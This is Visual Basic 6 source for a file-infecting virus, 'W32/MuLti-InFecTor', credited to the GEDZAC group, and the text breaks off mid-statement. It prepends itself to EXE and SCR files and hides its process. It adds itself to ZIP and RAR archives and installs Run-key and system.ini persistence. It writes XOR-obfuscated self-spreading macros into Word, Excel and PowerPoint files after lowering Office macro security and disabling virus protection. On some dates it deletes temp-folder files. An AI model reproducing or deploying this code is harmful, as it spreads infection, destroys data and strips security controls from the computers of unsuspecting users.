   VERSION 5.00
   Begin VB.Form Form1
      Caption         =   "Form1"
      ClientHeight    =   3195
      ClientLeft      =   60
      ClientTop       =   345
      ClientWidth     =   4680
      Icon            =   "Multi-Infect.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   3195
      ScaleWidth      =   4680
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Declare Function GetPrivateProfileString Lib "Kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
   Private Declare Function GetCurrentProcessId Lib "Kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "Kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
   Private Declare Function WritePrivateProfileString Lib "Kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
   Const RSP_SIMPLE_SERVICE = 1: Const RSP_UNREGISTER_SERVICE = 0
   Dim Fs, Sw, Sd, CodeB64, CodeScript1, CodeScript2, VBSMf, CodMp, wzp, wzx, wzt, wrp, wrx, wrt: Dim Wm1(5): Dim Vx As String

   Private Sub Form_Load()
   'W32/MuLti-InFecTor By MachineDramon/GEDZAC  -  Falckon/GEDZAC
   'Hecho en Sudamerica (Perú - Mexico)
   'Infector de exe/scr/doc/xls/ppt/html/htm/plg/vbs/vbe/zip/rar
   'Sin Carga Destructiva
   'Derechos reservados

   On Error Resume Next
   HideProcess: App.TaskVisible = False
   Set Fs = CreateObject("Scripting.FileSystemObject")
   Set Sw = CreateObject("WScript.Shell")

   If Fs.FileExists(Sp(1) & "\Multi-Infect.dll") Then
   Call MultiInfector
   Else
   Call PcInfected
   End If

   End Sub

   Sub PptInfected()
   On Error Resume Next
   Set Wpt = CreateObject("PowerPoint.Application")
   DisabledSP Wpt
   Id = Shell(Wpt.Path & "\POWERPNT.EXE")
   Set Pd = Fs.Drives
   For Each Pdt In Pd
   If (Pdt.DriveType = 2) Or (Pdt.DriveType = 3) Then
   Set Sps = Wpt.FileSearch: Sps.NewSearch: Sps.LookIn = Pdt.Path & "\"
   Sps.SearchSubFolders = True: Sps.FileName = "*.ppt; *.pot; *.pps": Sps.Execute
   For i = 1 To Sps.FoundFiles.Count
   Wpt.WindowState = 2
   Set Ps = Wpt.Presentations.Open(Sps.FoundFiles(i))

   For g = 0 To Ps.VBProject.VBComponents.Count

   If (Ps.VBProject.VBComponents.Count = 0) Then
   InsertMod Ps
   Else
   If g = 0 Then j = 1 Else j = g
   If (Ps.VBProject.VBComponents(j).CodeModule.Lines(1, 1) <> "'<!GEDZAC>") Then
   InsertMod Ps
   End If

   End If

   Ps.Save
   Next
   Next
   End If
   Next
   Wpt.Quit: Wpt = Nothing
   End Sub

   Sub InsertMod(Ps)
   On Error Resume Next
   Set Gm = Ps.VBProject.VBComponents.Add(1)
   Sc = Ps.Slides.Count: Sc = Sc - (Sc - 1)
   If Sc = 0 Then Exit Sub
   Gm.CodeModule.InsertLines 1, CodMp
   Set Shp = Ps.Slides(Sc).Shapes.AddShape(1, 0, 0, Ps.PageSetup.SlideWidth, Ps.PageSetup.SlideHeight)
   With Shp
   .Name = "GEDZAC"
   .ZOrder (msoSendToBack)
   .Line.Visible = False
   .Fill.Visible = False
   .ActionSettings(2).Action = ppActionRunMacro
   .ActionSettings(2).Run = "MultiInfector"
   End With

   Randomize: k = Int(Rnd * 5)
   Ps.Slides(Sc).Shapes.AddOLEObject Left:=50, Top:=50, Width:=50, Height:=50, FileName:=Sp(2) & Wm1(k), link:=False

   Sh = Ps.Slides(Sc).Shapes.Count
   Ps.Slides(Sc).Shapes(Sh).Name = "Mf"

   End Sub

   Sub DisabledSP(Wpt)
   On Error Resume Next
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Int(Wpt.Version) & ".0\PowerPoint\Options\NewSlideDialog", 0, "Hex"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Int(Wpt.Version) & ".0\PowerPoint\Options\StartupDialog", 0, "Hex"

   If Int(Wpt.Version) > 8 Then

   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\PowerPoint\Security\Level", 1, "REG_DWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\PowerPoint\Security\AccessVBOM", 1, "REG_DWORD"
   Rw "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\10.0\PowerPoint\Security\Level", 1, "REG_DWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\PowerPoint\Security\Level", 1, "REG_DWORD"
   Rw "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\9.0\PowerPoint\Security\Level", 1, "REG_DWORD"
   Wpt.CommandBars("View").Controls(8).Enabled = False
   Wpt.CommandBars("Visual Basic").Enabled = False
   Wpt.CommandBars("Tools").Controls("Macro").Enabled = False
   Wpt.CommandBars("Tools").Controls(10).Enabled = False
   Wpt.CommandBars("Tools").Controls(11).Enabled = False
   Wpt.CommandBars("Tools").Controls(12).Enabled = False

   ElseIf Int(Wpt.Version) < 9 Then

   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options\MacroVirusProtection", 0, "D"
   Rw "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options\MacroVirusProtection", 0, "D"
   Rw "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\PowerPoint\Options\MacroVirusProtection", 0, "D"
   Rw "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\8.0\PowerPoint\Options\MacroVirusProtection", 0, "D"
   Wpt.CommandBars("View").Controls(10).Enabled = False
   Wpt.CommandBars("Visual Basic").Enabled = False
   Wpt.CommandBars("Tools").Controls("Macro").Enabled = False
   Wpt.CommandBars("Tools").Controls(12).Enabled = False
   Wpt.CommandBars("Tools").Controls(13).Enabled = False
   Wpt.CommandBars("Tools").Controls(14).Enabled = False
   End If
   End Sub

   Function IsInfected(x)
   On Error Resume Next
   Dim Vs As String: n = FrFile
   Open x For Binary Access Read As n
   Vs = Space(LOF(n))
   Get n, , Vs
   Close n
   If InStr(Vs, "MuLti-InFecTor") <> 0 Then IsInfected = True Else IsInfected = False
   End Function

   Function FrFile()
   On Error Resume Next
   FrFile = FreeFile
   End Function
   Sub PcInfected()
   On Error Resume Next
   If IsInfected(Sp(3)) = False Then
   FileCopy Sp(3), Sp(0) & "\Multi-Infector.pif"
   ElseIf IsInfected(Sp(3)) = True Then
   RegHost Sp(3)
   RegVir Sp(3)
   End If

   Rm1 = Rm: Rm2 = Rm
   FileCopy Sp(0) & "\Multi-Infector.pif", Sp(1) & "\" & Rm1 & ".pif"
   FileCopy Sp(0) & "\Multi-Infector.pif", Sp(1) & "\" & Rm2 & ".pif"
   FileCopy Sp(0) & "\Multi-Infector.pif", Sp(1) & "\Multi-Infect.dll"
   Rw "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\W32Load", Sp(1) & "\" & Rm1 & ".pif", ""
   WIni "boot", "shell", "Explorer.exe " & Sp(1) & "\" & Rm2 & ".pif", Sp(0) & "\System.ini"

   Id = Shell(Sp(1) & "\" & Rm1 & ".pif")
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "DWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
   Fs.DeleteFile Sp(0) & "\Multi-Infector.pif"
   End
   End Sub

   Sub MultiInfector()
   On Error Resume Next
   If (IsInfected(Sp(3)) = False) And (Right(LCase(Sp(3)), 3) = "pif") Then
   If Day(Date) = 26 Then Call Mensage
   Call Variables
   Call DocInfected
   Call XlsInfected
   Call MDisk
   Call PptInfected
   If Day(Date) Mod 2 = 0 Then ClearFolder (Sp(2))
   ElseIf IsInfected(Sp(3)) = True Then
   RegHost Sp(3)
   End
   Else
   End
   End If
   End Sub

   Sub ExeInfected(Xp)
   On Error Resume Next
   Dim host As String: n = FrFile: SA Xp, 0

   If InStr(LCase(Xp), "winzip") <> 0 Then Exit Sub
   If InStr(LCase(Xp), "winrar") <> 0 Then Exit Sub '7 dias heghcvfsfhhjukgdgcbdgw hj k mkif ghjk klg

   Open Xp For Binary Access Read As n
   host = Space(LOF(n))
   Get n, , host
   Close n

   If InStr(host, "MuLti-InFecTor") <> 0 Then

   Exit Sub

   Else

   n = FrFile
   Open Xp For Binary Access Write As n
   Put n, , Vx
   Put n, , host
   Put n, , "MuLti-InFecTor"
   Close n
   End If
   End Sub

   Sub RegHost(Xp)
   On Error Resume Next
   Dim Xn As Long: Randomize: n = FrFile
   Xn = Int(Rnd * 1000000)

   Dim Vs2 As String, host2 As String

   Open Xp For Binary Access Read As n
   Vs2 = Space(38400)
   host2 = Space(LOF(1) - 38400)
   Get n, , Vs2
   Get n, , host2
   Close n

   n = FrFile
   If LCase(Right(Xp, 3)) = "exe" Then
   Open Sp(2) & "\" & Xn & ".exe" For Binary Access Write As n
   Put n, , host2
   Close n: Id = Shell(Sp(2) & "\" & Xn & ".exe")
   ElseIf LCase(Right(Xp, 3)) = "scr" Then
   Open Sp(2) & "\" & Xn & ".scr" For Binary Access Write As n
   Put n, , host2
   Close n: Sw.Run Sp(2) & "\" & Xn & ".scr"
   End If 'MFolder ("C:\ppt\")fdgfdgdgddfg
   End Sub

   Sub RegVir(Xp)
   On Error Resume Next
   Dim Vs3 As String: n = FrFile

   Open Xp For Binary Access Read As n
   Vs3 = Space(38400)
   Get n, , Vs3
   Close n

   n = FrFile
   Open Sp(0) & "\Multi-Infector.pif" For Binary Access Write As n
   Put n, , Vs3
   Close n
   End Sub

   Sub ZipInfected(Xp, Xn)
   On Error Resume Next: SA Xp, 0
   If wzt <> True Then Exit Sub
   If InStr(wzx, Xn) <> 0 Then Exit Sub
   Randomize: i = Int(Rnd * 5)

   Id = Shell(wzp & " -a " & Xp & " " & Sp(2) & Wm1(i), vbHide)

   Set Wd1 = Fs.OpenTextFile(Sp(1) & "\WzDat.dat", 8)
   Wd1.Write Xn
   Wd1.Close
   End Sub

   Sub RarInfected(Xp, Xn)
   On Error Resume Next: SA Xp, 0
   If wrt <> True Then Exit Sub
   If InStr(wrx, Xn) <> 0 Then Exit Sub
   Randomize: i = Int(Rnd * 5)

   Id = Shell(wrp & " a " & Xp & " " & Sp(2) & Wm1(i), vbHide)

   Set Wa1 = Fs.OpenTextFile(Sp(1) & "\WrDat.dat", 8)
   Wa1.Write Xn
   Wa1.Close
   End Sub

   Sub ClearFolder(Xp)
   On Error Resume Next
   Set Cfg = Fs.GetFolder(Xp): Set Cfs = Cfg.Files
   For Each Cg In Cfs
   Fs.DeleteFile (Cg.Path)
   Next
   End Sub

   Sub HideProcess()
   On Error Resume Next: Dim H As Long
   H = RegisterServiceProcess(GetCurrentProcessId(), RSP_SIMPLE_SERVICE)
   End Sub

   Sub DocInfected()
   On Error Resume Next: Dim Nl As Integer
   Set Wr = CreateObject("Word.Application")
   Wr.Visible = False: DisabledSW Wr: SA Wr.NormalTemplate.Path, 0
   Set Wnd = Wr.NormalTemplate.VBProject.VBComponents.Item(1)

   If LCase(Wnd.CodeModule.Lines(1, 1)) = "'gedzac" Then
   Set Wnd = Nothing: Wr.Quit
   Exit Sub
   Wnd.Name = "GEDZAC"
   End If

   Dim M1, M2, M3, M4, M5, MCV As String
   Set Wmw = Fs.CreateTextFile(Sp(1) & "\mcw.vir")
   M1 = "'GEDZAC" & vbCrLf & _
   "Sub AutoExec()" & vbCrLf & _
   "On Error Resume Next" & vbCrLf & _
   "Key8 = BuildKeyCode(wdKeyAlt, wdKeyF8): Key11 = BuildKeyCode(wdKeyAlt, wdKeyF11)" & vbCrLf & _
   "Ktip = wdKeyCategoryCommand" & vbCrLf & "KeyBindings.Add Ktip, ¢Keys¢, Key8" & vbCrLf & _
   "KeyBindings.Add Ktip, ¢Keys¢, Key11" & vbCrLf & "End Sub" & vbCrLf & _
   "Private Sub Document_Close()" & vbCrLf & "On Error Resume Next" & vbCrLf & _
   "Dim w, f, Vw(4), n, Nm, ISM, VPath" & vbCrLf & _
   "Set AD = ActiveDocument.VBProject.VBComponents.Item(1)" & vbCrLf & _
   "Set NT = NormalTemplate.VBProject.VBComponents.Item(1)" & vbCrLf & _
   "Set w = CreateObject(u(¢PTdunws)Tobkk¢))" & vbCrLf & _
   "Set f = CreateObject(u(¢Tdunwsni`)AnkbT~tsbjHembds¢))" & vbCrLf & _
   "Nm = LCase(AD.Name)" & vbCrLf & "If Nm <> u(¢`bc}fd¢) Then" & vbCrLf & _
   "Vw(0) = u(¢[PhucFtntsfic)chd)tdu¢): Vw(1) = u(¢[NiahujbDrbisft)s s)b b¢)" & vbCrLf & _
   "Vw(2) = u(¢[PniDhjwhibis)efs¢): Vw(3) = u(¢[Chdrjbis)chd)wna¢)" & vbCrLf & _
   "Vw(4) = u(¢[PhucKhfc)chd)dhj¢)" & vbCrLf & "Randomize" & vbCrLf

   M2 = "n = Int(Rnd * 5): VPath = f.GetSpecialFolder(2) & Vw(n)" & vbCrLf & _
   "If Dir(VPath) = ¢¢ Then" & vbCrLf & _
   "FileCopy f.GetSpecialFolder(1) & u(¢[Jrksn*Niabds)ckk¢), VPath" & vbCrLf & _
   "End If" & vbCrLf & "NL = AD.Codemodule.CountOfLines" & vbCrLf & _
   "If NL > 0 Then AD.Codemodule.DeleteLines 1, NL" & vbCrLf & _
   "ISM = u(¢Wunqfsb'Tre'ChdrjbisXHwbi/.¢) & vbCrLf & u(¢Hi'Buuhu'Ubtrjb'ib s¢) & vbCrLf & u(¢Tbs'p':'DubfsbHembds/¢) & Chr(34) & u(¢PTdunws)Tobkk¢) & Chr(34) & u(¢.¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Tbs'a':'DubfsbHembds/¢) & Chr(34) & u(¢Tdunwsni`)AnkbT~tsbjHembds¢) & Chr(34) & u(¢.¢) & vbCrLf & _" & vbCrLf & _
   "u(¢FJ':'@bsFssu/a)@bsTwbdnfkAhkcbu/6.'!'¢) & Chr(34) & u(¢[Jrksn*Niabds)ckk¢) & Chr(34) & u(¢.¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Na'FJ':'¢) & Chr(34) & Chr(34) & u(¢'sobi¢) & vbCrLf & u(¢FdsnqbChdrjbis)Tofwbt/6.)Qntnekb':'Surb¢) & vbCrLf & _" & vbCrLf & _
   "u(¢TQnu':'FdsnqbChdrjbis)Tofwbt/6.)HKBAhujfs)DkfttS~wb¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Pnso'FdsnqbChdrjbis)Tofwbt/6.)HKBAhujfs¢) & vbCrLf & _" & vbCrLf & _
   "u(¢'''')FdsnqfsbFt'DkfttS~wb=:TQnu¢) & vbCrLf & _" & vbCrLf & _
   "u(¢'''')Fdsnqfsb¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Bic'Pnso¢) & vbCrLf & u(¢bktb¢) & vbCrLf & u(¢FdsnqbChdrjbis)Tofwbt/6.)Qntnekb':'Afktb¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Bic'Na¢) & vbCrLf & _" & vbCrLf & _
   "u(¢na'Kdftb/Ihujfksbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)Ifjb.';9'¢) & Chr(34) & u(¢`bc}fd¢) & Chr(34) & u(¢'sobi¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Lb~?':'ErnkcLb~Dhcb/pcLb~Fks+'pcLb~A?.='Lb~66':'ErnkcLb~Dhcb/pcLb~Fks+'pcLb~A66.=Lsnw':'pcLb~Dfsb`hu~Dhjjfic¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Lb~Enicni`t)Fcc'Lsnw+'¢) & Chr(34) & u(¢Lb~o¢) & Chr(34) & u(¢+'Lb~?¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Lb~Enicni`t)Fcc'Lsnw+'¢) & Chr(34) & u(¢Lb~o¢) & Chr(34) & u(¢+'Lb~66¢) & vbCrLf & _" & vbCrLf & _
   "u(¢Bic'Na¢) & vbCrLf & NT.Codemodule.lines(49, NT.Codemodule.CountOfLines)" & vbCrLf

   M3 = "AD.Codemodule.InsertLines 1, ISM" & vbCrLf & "AD.Codemodule.ReplaceLine 61, ¢Sub Keyh()¢" & vbCrLf & _
   "ActiveDocument.Shapes.AddOLEObject , VPath, False" & vbCrLf & "AD.Name = u(¢@BC]FD¢)" & vbCrLf & _
   "If ActiveDocument.Path <> ¢¢ Then ActiveDocument.Save" & vbCrLf & _
   "End If" & vbCrLf & "If Int(Application.Version) > 8 Then" & vbCrLf & _
   "w.RegWrite u(¢OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[67)7[Phuc[Tbdruns~[Kbqbk¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "w.RegWrite u(¢OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[67)7[Phuc[Tbdruns~[FddbttQEHJ¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "w.RegWrite u(¢OLB^XRTBUT[)CBAFRKS[Thaspfub[Jnduhthas[Haandb[67)7[Phuc[Tbdruns~[Kbqbk¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "w.RegWrite u(¢OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[>)7[Phuc[Tbdruns~[Kbqbk¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "w.RegWrite u(¢OLB^XRTBUT[)CBAFRKS[Thaspfub[Jnduhthas[Haandb[>)7[Phuc[Tbdruns~[Kbqbk¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "CommandBars(u(¢Shhkt¢)).Controls(u(¢Jfduh¢)).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(u(¢Qnbp¢)).Controls(5).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(u(¢Shhkt¢)).Controls(17).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(u(¢Shhkt¢)).Controls(18).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(u(¢Shhkt¢)).Controls(19).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "ScreenUpdating = u(¢Afktb¢)" & vbCrLf & "DisplayAlerts = u(¢Afktb¢)" & vbCrLf & _
   "Options.ConfirmConversions = u(¢Afktb¢)" & vbCrLf & _
   "Options.SaveNormalPrompt = u(¢Afktb¢)" & vbCrLf

   M4 = "EnableCancelKey = 0" & vbCrLf & _
   "ShowVisualBasicEditor = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(¢Visual Basic¢).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "ElseIf Int(Application.Version) < 9 Then" & vbCrLf & _
   "CommandBars(u(¢Shhkt¢)).Controls(u(¢Jfduh¢)).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(u(¢Shhkt¢)).Controls(14).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(u(¢Shhkt¢)).Controls(15).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(u(¢Shhkt¢)).Controls(16).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(u(¢Qnbp¢)).Controls(6).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "Options.VirusProtection = u(¢Afktb¢)" & vbCrLf & "Options.ConfirmConversions = u(¢Afktb¢)" & vbCrLf & _
   "Options.SaveNormalPrompt = u(¢Afktb¢)" & vbCrLf & "ScreenUpdating = u(¢Afktb¢)" & vbCrLf & _
   "DisplayAlerts = u(¢Afktb¢)" & vbCrLf & "EnableCancelKey = 0" & vbCrLf & _
   "ShowVisualBasicEditor = u(¢Afktb¢)" & vbCrLf & _
   "CommandBars(¢Visual Basic¢).Enabled = u(¢Afktb¢)" & vbCrLf & _
   "End If" & vbCrLf & "End Sub" & vbCrLf & "Private Function u(s)" & vbCrLf

   M5 = "On Error Resume Next" & vbCrLf & "For i = 1 To Len(s)" & vbCrLf & _
   "u = u & Chr(Asc(Mid(s, i, 1)) Xor 7)" & vbCrLf & "Next" & vbCrLf & _
   "End Function" & vbCrLf & "Sub Keys()" & vbCrLf & _
   "On Error Resume Next" & vbCrLf & "Dim Lg As String" & vbCrLf & _
   "Lg = Application.Languages(Application.Language)" & vbCrLf & _
   "If InStr(LCase(Lg), u(¢btwföhk¢)) <> 0 Then" & vbCrLf & _
   "MsgBox u(¢Dhjwhibisb'ih'Qæknch¢), 16, u(¢Buuhu¢)" & vbCrLf & _
   "Else" & vbCrLf & "MsgBox u(¢Ihi'Qfknc'dhjwhibis¢), 16, u(¢Buuhu¢)" & vbCrLf & _
   "End If" & vbCrLf & "End Sub" & vbCrLf

   MCV = M1 & M2 & M3 & M4 & M5
   MCV = Replace(MCV, "¢", Chr(34)): Wmw.Write MCV
   Wmw.Close

   Set Wcm = Wnd.CodeModule
   If Wcm.CountOfLines > 0 Then
   Wcm.DeleteLines 1, Wcm.CountOfLines
   End If

   Set Wmr = Fs.OpenTextFile(Sp(1) & "\mcw.vir")
   Nl = 1
   Do While Wmr.AtendOfstream = False
   Wline = Wmr.ReadLine
   DoEvents
   Wcm.InsertLines Nl, Wline: Nl = Nl + 1
   Loop
   Wmr.Close
   SA Wr.NormalTemplate.Path, 0: Wr.NormalTemplate.Save: SA Wr.NormalTemplate.Path, 1
   Set Wcm = Nothing: Set Wnd = Nothing: Wr.Quit: Set Wr = Nothing
   End Sub

   Sub DisabledSW(Wr)
   On Error Resume Next

   If Int(Wr.Version) > 8 Then

   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
   Rw "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD" 'Desde Abajo Te Devora
   Rw "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"

   Wr.CommandBars("View").Controls(5).Enabled = False
   Wr.CommandBars("Tools").Controls("Macro").Enabled = False
   Wr.CommandBars("Tools").Controls(17).Enabled = False
   Wr.CommandBars("Tools").Controls(18).Enabled = False
   Wr.CommandBars("Tools").Controls(19).Enabled = False
   Wr.CommandBars("Visual Basic").Enabled = False
   Wr.DisplayAlerts = False
   Wr.Options.ConfirmConversions = False
   Wr.Options.SaveNormalPrompt = False
   Wr.Options.VirusProtection = False
   Wr.ShowVisualBasicEditor = False
   Wr.EnableCancelKey = 0
   Wr.ScreenUpdating = False

   ElseIf Int(Wr.Version) < 9 Then
   Wr.CommandBars("View").Controls(6).Enabled = False
   Wr.CommandBars("Tools").Controls(14).Enabled = False
   Wr.CommandBars("Tools").Controls(15).Enabled = False
   Wr.CommandBars("Tools").Controls(16).Enabled = False
   Wr.CommandBars("Tools").Controls("Macro").Enabled = False
   Wr.Options.VirusProtection = False 'el sauce se va secando, pero la semilla persiste, cuando la tierra sea la idónea para plantarla, el sauce germinará y habrá otra oportunidad”.
   Wr.Options.ConfirmConversions = False
   Wr.Options.SaveNormalPrompt = False
   Wr.ScreenUpdating = False
   Wr.DisplayAlerts = False
   Wr.EnableCancelKey = 0
   Wr.ShowVisualBasicEditor = False
   Wr.CommandBars("Visual Basic").Enabled = False

   End If
   End Sub

   Sub XlsInfected()
   On Error Resume Next
   Set Xl = CreateObject("Excel.Application")
   Xl.Visible = False
   DisabledXS Xl

   If Dir(Xl.StartupPath & "\Template.xls") = "" Then

   Kill Xl.StartupPath & "\*.*": Xl.WorkBooks.Add
   Set Axl = Xl.ActiveWorkBook.VBProject.VBComponents.Item(1)

   Dim X1, X2, X3, X4, MCV As String
   Set Cmx = Fs.CreateTextFile(Sp(1) & "\mcx.vir")

   X1 = "'GEDZAC" & vbCrLf & "Private Sub Workbook_Open()" & vbCrLf & _
   "On Error Resume Next" & vbCrLf & "Windows(Me.Name).Visible = True" & vbCrLf & _
   "End Sub" & vbCrLf & "Private Sub Workbook_Deactivate()" & vbCrLf & _
   "On Error Resume Next" & vbCrLf & "Dim f, Axl, Mx, Xv(4), VPath" & vbCrLf & _
   "Set f = CreateObject(x(¢Tdunwsni`)AnkbT~tsbjHembds¢))" & vbCrLf & _
   "Set Axl = ActiveWorkbook.VBProject.VBComponents.Item(1)" & vbCrLf & _
   "Set Mx = Me.VBProject.VBComponents.Item(1)" & vbCrLf & _
   "If LCase(Axl.CodeModule.Lines(1, 1)) <> x(¢ `bc}fd¢) Then" & vbCrLf & _
   "Xv(0) = x(¢[ChdrjbisDfkd) kt)b b¢): Xv(1) = x(¢[JtObkw) kt)efs¢): Xv(2) = x(¢[JtKndbitb) kt)dhj¢)" & vbCrLf & _
   "Xv(3) = x(¢[_kF`bis) kt)wna¢): Xv(4) = x(¢[Ubdhusb) kt)wna¢)" & vbCrLf & _
   "Randomize: n = Int(Rnd * 5): VPath = f.GetSpecialFolder(2) & Xv(n)" & vbCrLf & _
   "If Dir(VPath) = ¢¢ Then" & vbCrLf & "FileCopy f.GetSpecialFolder(1) & x(¢[Jrksn*Niabds)ckk¢), VPath" & vbCrLf & _
   "End If" & vbCrLf & "If Axl.CodeModule.CountOfLines > 0 Then Axl.CodeModule.DeleteLines 1, Axl.CodeModule.CountOfLines" & vbCrLf

   X2 = "Dim ISM As String: ISM = Mx.CodeModule.Lines(27, Mx.CodeModule.CountOfLines)" & vbCrLf & _
   "Axl.CodeModule.InsertLines 1, x(¢ @BC]FD¢) & vbCrLf & ISM" & vbCrLf & _
   "Application.Worksheets(1).Shapes.AddOLEObject Left:=100, Top:=100, Width:=200, Height:=300, Filename:=VPath, link:=False" & vbCrLf & _
   "If ActiveWorkbook.Path <> ¢¢ Then ActiveWorkbook.Save" & vbCrLf & _
   "End If" & vbCrLf & "Windows(Me.Name).Visible = x(¢Afktb¢)" & vbCrLf & _
   "End Sub" & vbCrLf & "Private Sub Workbook_Activate()" & vbCrLf & _
   "On Error Resume Next" & vbCrLf & "Dim w, f1: Set w = CreateObject(x(¢PTdunws)Tobkk¢)): Set f1 = CreateObject(x(¢Tdunwsni`)AnkbT~tsbjHembds¢))" & vbCrLf & _
   "If Dir(f1.GetSpecialFolder(1) & x(¢[Jrksn*Niabds)ckk¢)) = ¢¢ Then" & vbCrLf & _
   "Application.Worksheets(1).Visible = True" & vbCrLf & "Application.Worksheets(1).Shapes(1).OLEFormat.Activate" & vbCrLf & _
   "Else" & vbCrLf & "Application.Worksheets(1).Visible = False" & vbCrLf & _
   "End If" & vbCrLf & "If Int(Application.Version) > 8 Then" & vbCrLf & _
   "w.Regwrite x(¢OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[67)7[B dbk[Tbdruns~[Kbqbk¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "w.Regwrite x(¢OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[67)7[B dbk[Tbdruns~[FddbttQEHJ¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "w.Regwrite x(¢OLB^XRTBUT[)CBAFRKS[Thaspfub[Jnduhthas[Haandb[67)7[B dbk[Tbdruns~[Kbqbk¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "w.Regwrite x(¢OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[>)7[B dbk[Tbdruns~[Kbqbk¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "w.Regwrite x(¢OLB^XRTBUT[)CBAFRKS[Thaspfub[Jnduhthas[Haandb[>)7[B dbk[Tbdruns~[Kbqbk¢), 1, ¢REG_DWORD¢" & vbCrLf & _
   "Application.ScreenUpdating = x(¢Afktb¢)" & vbCrLf

   X3 = "Application.DisplayStatusBar = x(¢Afktb¢)" & vbCrLf & _
   "Application.DisplayAlerts = x(¢Afktb¢)" & vbCrLf & "Application.EnableCancelKey = 0" & vbCrLf & _
   "Application.CommandBars(x(¢Pnichp¢)).Controls(4).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Qnbp¢)).Controls(3).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Qntrfk'Eftnd¢)).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Shhkt¢)).Controls(x(¢Jfduh¢)).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Shhkt¢)).Controls(12).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Shhkt¢)).Controls(13).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Shhkt¢)).Controls(14).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "ElseIf Int(Application.Version) < 9 Then" & vbCrLf & "w.Regwrite x(¢OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[?)7[B dbk[Jnduhthas'B dbk[Hwsnhit1¢), 0, ¢REG_DWORD¢" & vbCrLf & _
